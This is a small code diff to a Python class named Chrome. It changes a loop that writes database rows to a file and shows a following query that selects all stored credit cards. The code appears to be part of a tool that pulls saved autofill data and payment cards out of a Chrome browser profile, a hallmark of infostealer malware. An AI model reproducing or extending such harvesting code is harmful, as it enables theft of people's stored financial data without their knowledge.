@@ -108,7 +108,7 @@ class Chrome:
                     for item in cursor.fetchall():
                         name = item[0]
                         value = item[1]
-                        f.write(f"{name}: {value}")
+                        f.write(f"{name}: {value}\n")
 
                 cursor.execute("SELECT * FROM credit_cards")
 
